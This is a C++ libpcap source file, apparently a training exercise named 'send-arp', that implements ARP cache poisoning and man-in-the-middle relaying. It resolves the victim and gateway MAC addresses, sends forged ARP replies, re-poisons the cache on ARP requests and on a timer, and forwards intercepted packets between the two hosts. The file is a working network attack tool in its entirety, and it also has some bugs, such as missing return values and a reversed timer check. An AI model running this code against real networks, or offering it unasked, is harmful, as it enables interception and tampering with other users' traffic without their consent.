#include <cstdio>
#include <pcap.h>
#include <time.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ipv4hdr.h"
#include "main.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpv4Packet final {
  EthHdr eth_;
  Ipv4Hdr ip_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
using namespace std;

Mac get_current_mac(char* dev) {
  struct ifreq s;
  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  strcpy(s.ifr_name, dev);
  if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
    char mac[18];
    for (int i = 0; i < 6; ++i) {
      snprintf(mac + 3 * i, 4, "%02x", (unsigned char) s.ifr_addr.sa_data[i]);
      if (i < 5) {
        snprintf(mac + 3 * i + 2, 2, ":");
      }
    }
    string mac_s = mac;
    Mac res = Mac(mac_s);
    return res;
  }
}

Ip get_current_ip(char* dev) {
  int fd;
  struct ifreq ifr;

  fd = socket(AF_INET, SOCK_DGRAM, 0);
  /* I want to get an IPv4 IP address */
  ifr.ifr_addr.sa_family = AF_INET;

  /* I want IP address attached to "eth0" */
  strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

  ioctl(fd, SIOCGIFADDR, &ifr);

  // close(fd);

  return Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

Mac get_mac_by_ip(pcap_t *pcap_handle, Mac my_mac, Ip my_ip, Ip ip) {
  send_arp(pcap_handle, my_mac, Mac("ff:ff:ff:ff:ff:ff"), my_mac, my_ip, Mac("00:00:00:00:00:00"), ip, ArpHdr::Request);
  
  while (true) {
		
    struct pcap_pkthdr* header;
		const u_char* packet;
    int res = pcap_next_ex(pcap_handle, &header, &packet);
    if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap_handle));
			break;
		}
    EthArpPacket* eth_arp_packet = (EthArpPacket*) packet;
    
    if (eth_arp_packet->eth_.type() == EthHdr::Arp && eth_arp_packet->arp_.sip() == ip) {
      return eth_arp_packet->eth_.smac(); 
    }
	}
}

void send_arp(
    pcap_t* pcap_handle,
    Mac eth_smac,
    Mac eth_dmac,
    Mac arp_smac,
    Ip arp_sip,
    Mac arp_tmac,
    Ip arp_tip,
    uint16_t type
  ) {
	EthArpPacket packet;

  packet.eth_.dmac_ = eth_dmac; // Mac("00:00:00:00:00:00");
	packet.eth_.smac_ = eth_smac; // Mac("00:00:00:00:00:00");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type); // ArpHdr::Request);
	packet.arp_.smac_ = arp_smac; // Mac("00:00:00:00:00:00");
	packet.arp_.sip_ = htonl(arp_sip); // htonl(Ip("0.0.0.0"));
	packet.arp_.tmac_ = arp_tmac; // Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(arp_tip);  // Ip("0.0.0.0"));

	int res = pcap_sendpacket(pcap_handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap_handle));
	}

}

int attack(char *dev, char *_target_ip, char *_sender_ip) {
	char errbuf[PCAP_ERRBUF_SIZE];
  
  pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
  
  if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
	  return -1;
  }

  Mac current_mac = get_current_mac(dev);
  Ip current_ip = get_current_ip(dev);
  
  Ip target_ip = Ip(_target_ip);
  Ip sender_ip = Ip(_sender_ip);
  cout << "target: " << string(target_ip) << " sender: " << string(sender_ip) << '\n';
  Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
  Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
  
  // Mac sender_mac = Mac("7C:10:C9:D2:82:96");
  // Mac target_mac = Mac("00:23:AA:79:8C:9C");

  cout << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
  send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
  clock_t init = clock();
  clock_t init_zero = clock();
  while (true) {
    clock_t start_loop = clock();
    // printf("[%f]", (double) start_loop - init_zero);
    struct pcap_pkthdr* header;
		const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

    EthArpPacket* recover_packet = (EthArpPacket*) packet;
    // recover packet
    if (recover_packet->eth_.type() == EthHdr::Arp && recover_packet->arp_.op() == ArpHdr::Request && recover_packet->arp_.tip() == target_ip) {
      printf("poisoning arp again - arp received\n");
      send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
      continue;
    } else if ((init - clock()) > 3000) {
      // more than 3s, re poision arp table of sender
      printf("poisoning arp again - time passed than 3times\n");
      send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
      init = clock();
      continue;
    }

    EthIpv4Packet* spoof_packet = (EthIpv4Packet*) packet;
    // sender -> me -> target
    if (spoof_packet->eth_.smac() == sender_mac && spoof_packet->eth_.dmac() == current_mac) {
      if (spoof_packet->eth_.type() == EthHdr::Ip4) {
        printf("ipv4 ");
      } else if (spoof_packet->eth_.type() == EthHdr::Arp) {
        printf("arp ");
      } else {
        printf("unknown (%x) ", spoof_packet->eth_.type());
      }
      spoof_packet->eth_.smac_ = current_mac;
      spoof_packet->eth_.dmac_ = target_mac;
      int res = pcap_sendpacket(handle, packet, header->caplen);
	    if (res != 0) {
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    } else {
        printf("packet relayed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start_loop));
      }
    } else if (spoof_packet->eth_.smac() == target_mac && spoof_packet->eth_.dmac() == current_mac) {
      // target -> me -> sender
      if (spoof_packet->ip_.tip() == sender_ip) {
        spoof_packet->eth_.smac_ = current_mac;
        spoof_packet->eth_.dmac_ = sender_mac;
        int res = pcap_sendpacket(handle, packet, header->caplen);
	      if (res != 0) {
		      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	      } else {
          printf("packet replyed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start_loop));
        }
      }
    }
	}
  pcap_close(handle);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
    usage();
    return -1;
	}

	char* dev = argv[1];
  printf("%d\n", argc);
  for (int i = 2; i < argc; i += 2) {
    attack(dev, argv[i + 1], argv[i]);
  }

  return 1;
}
